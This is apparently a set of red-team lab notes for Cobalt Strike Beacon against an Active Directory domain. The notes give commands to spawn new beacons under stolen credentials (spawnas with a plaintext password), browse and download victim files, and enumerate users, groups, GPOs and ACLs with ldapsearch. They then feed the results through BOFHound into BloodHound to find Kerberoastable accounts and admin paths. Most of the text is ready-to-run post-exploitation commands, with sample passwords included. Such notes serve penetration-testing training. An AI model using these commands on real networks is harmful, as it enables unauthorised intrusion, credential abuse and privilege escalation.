
âš ï¸ Sleep Configuration
- Not recommended: sleep 0 (often bugs/crashes)
- Recommended: Between 2 and 5 seconds

## Commands: spawn and spawnas
>Creates a new Beacon from the current one, using the same user or a new one (spawnas).
>The new process receives shellcode from the specified listener.
>Must be in an accessible path for the new user, or the command will fail.

```powershell
#SPAWN
beacon> spawn [x86|x64] [listener]
#Example:
beacon> spawn x64 http

#SPAWNAS
beacon> spawnas [DOMAIN\user] [password] [listener]
#Example:
beacon> cd C:\
beacon> spawnas CONTOSO\rsteel Passw0rd! http
```


- Domain Information
```powershell
ldapsearch -x -H ldap://10.10.121.107 -b "DC=contoso,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName
```


## ðŸ§© System Interaction

*file_browser*
> View file explorer as if you had RDP access.

```powershell
beacon> file_browser
```

*download*
> Download files from the beacon.
>View them in Beacon: View > Downloads > Sync Files


```powershell
beacon> download C:\Users\pchilds\Desktop\desktop.ini
```

*process_browser*
> View system processes like ps visually as a task manager.


```powershell
beacon> process_browser
```

*VNC*
> For RDP-like interaction.

```powershell
breacon> desktop high
```

*Shell / Run / Powershell*
>Run: Native Windows commands
>Shell: Native Linux commands
>PowerShell: Native PowerShell commands
```powershell
beacon> run klist

beacon> shell ls

beacon> powershell $env:computername
```


## **Enumeration**

**BOFHound does not enumerate anything by itself. It parses and converts to JSON all the information you previously extracted with ldapsearch. First run ldapsearch, then bofhound.

### ðŸ”Ž  Enumerate All Users

```powershell
beacon> ldapsearch (samAccountType=805306368)
```
###  Query Domains, OUs, GPOs, Users and Groups

```powershell
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) *,ntsecuritydescriptor


beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```


1. **BOFHound Workflow.BOFHound does not perform these queries, only interprets their results.**
	- Copy logs generated by ldapsearch from the team server:
```bash
cd /mnt/c/Users/Attacker/Desktop

scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .

Passw0rd!
```

2. **Run BOFHound against the logs:**:
```bash
bofhound -i logs/
```
3. Start Docker containers and access BloodHound:
```powershell
http://localhost:8080/ui/login

admin : eA%N4frBrnn2.
```

4. **Import JSON files to BloodHound (Administration > File Ingest)
```bash
#-- Once uploaded, explore with Cypher:
Match (n:GPO) return n

#-- Find Kerberoastable accounts:
MATCH (n:User) WHERE n.hasspn=true RETURN n

```

- Missing SID Names?
```powershell
ldapsearch (objectsid=S-1-5-21-XXXXX-XXXXX-XXXXX-YYYY) --attributes *,ntsecuritydescriptor


#Re-run logs through BOFHound:
bofhound -i logs/
```


## Example

```bash
#Click on a group like Workstation ADMINS.

Save the Object IDs of the member computers:

id wks 2 -> S-1-5-21-3926355307-1661546229-813047887-2102

id wks 1 -> S-1-5-21-3926355307-1661546229-813047887-2101
```

-  Examine GPO from Beacon
```powershell
ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\

download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

- Inspect the downloaded GptTmpl.inf file to find the Admin Group SID applying the policy(e.g.)
```bash
SID ADMIN -> S-1-5-21-3926355307-1661546229-813047887-1106

#Manually Add Relationships to BloodHound
>Since BOFHound might not automatically create this specific edge, add it manually with Cypher queries in the BloodHound UI:

MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
MERGE (y)-[:AdminTo]->(x)


MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
MERGE (y)-[:AdminTo]->(x)
```
